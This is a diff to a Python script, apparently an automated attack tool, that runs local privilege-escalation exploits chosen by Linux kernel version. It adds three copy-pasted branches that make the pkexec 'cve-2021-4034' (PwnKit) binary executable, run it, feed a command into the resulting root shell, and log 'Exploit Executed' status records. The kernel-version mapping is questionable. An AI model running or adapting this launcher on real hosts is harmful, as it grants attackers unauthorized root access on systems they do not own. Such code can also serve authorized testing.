@@ -2,7 +2,6 @@ import subprocess
 import re
 import json
 import platform
-import urllib
 import pymongo
 import stat
 import os
@@ -96,6 +95,35 @@ if operating_system == "Linux":
             print(child_process_output)
             dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Mishandle the recording of cred of process that wants to create ptrace ralationship'}
         
+        elif kernel_name1 == "5.14.0":
+            st = os.stat('cve-2021-4034')
+            os.chmod('cve-2021-4034', st.st_mode | stat.S_IEXEC)
+            args = ["./cve-2021-4034"]
+            child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+            child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
+            print(child_process_output)
+            dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Uses the vulnerable “pkexec” tool, and allows a local user to gain root system privileges on the affected host.'}
+        
+        elif kernel_name1 == "5.10.0":
+            st = os.stat('cve-2021-4034')
+            os.chmod('cve-2021-4034', st.st_mode | stat.S_IEXEC)
+            args = ["./cve-2021-4034"]
+            child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+            child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
+            print(child_process_output)
+            dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Uses the vulnerable “pkexec” tool, and allows a local user to gain root system privileges on the affected host.'}
+        
+
+        elif kernel_name1 == "5.15.0":
+            st = os.stat('cve-2021-4034')
+            os.chmod('cve-2021-4034', st.st_mode | stat.S_IEXEC)
+            args = ["./cve-2021-4034"]
+            child_proccess = subprocess.Popen(args, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
+            child_process_output = child_proccess.communicate(b"whoami > output.txt")[0]
+            print(child_process_output)
+            dict = {'Pre Attack':'Exploit Downloaded','Status':'Exploit Executed','Description':'Uses the vulnerable “pkexec” tool, and allows a local user to gain root system privileges on the affected host.'}
+        
+
         else:
             user = subprocess.Popen(['whoami'], stdout=subprocess.PIPE).communicate()[0]
             user = user.decode('utf-8')
@@ -107,8 +135,6 @@ if operating_system == "Linux":
             # with open('output.txt','w') as data:
             #     data.wrtie(str(dict))
             
-            
-            # 5.14.0 2021.4
         
 
 
